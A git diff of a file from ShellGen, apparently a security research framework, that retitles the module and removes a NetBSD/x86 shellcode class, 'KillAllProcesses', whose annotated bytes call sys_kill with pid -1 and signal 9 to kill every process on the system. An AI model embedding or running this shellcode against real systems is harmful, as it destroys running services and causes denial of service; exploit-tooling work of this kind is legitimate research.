@@ -1,8 +1,7 @@
 #!/usr/bin/env python
 
 ###############################################################################
-## NetBSD/x86 - kills all processes in the system                            ## 
-## Shellcode for ShellGen                                                    ##
+## Multiplatform shellcodes for ShellGen                                     ##
 ###############################################################################
 
 # Copyright (c) 2012 Mario Vilas
@@ -21,23 +20,3 @@
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 # MA 02110-1301, USA.
-
-__all__ = ["KillAllProcesses"]
-
-from shellgen import Static
-
-class KillAllProcesses (Static):
-    encoding = ["nullfree"]
-
-    bytes = (
-
-        # int sys_kill(int pid, int signum);
-        "\x6a\x09"          # push    9         ; signum = 9
-        "\x31\xc0"          # xor     eax, eax
-        "\x48"              # dec     eax
-        "\x50"              # push    eax       ; pid = -1
-        "\x40"              # inc     eax
-        "\xb0\x25"          # mov     al, 25h
-        "\x50"              # push    eax       ; syscall = 0x25
-        "\xcd\x80"          # int     80h
-    )
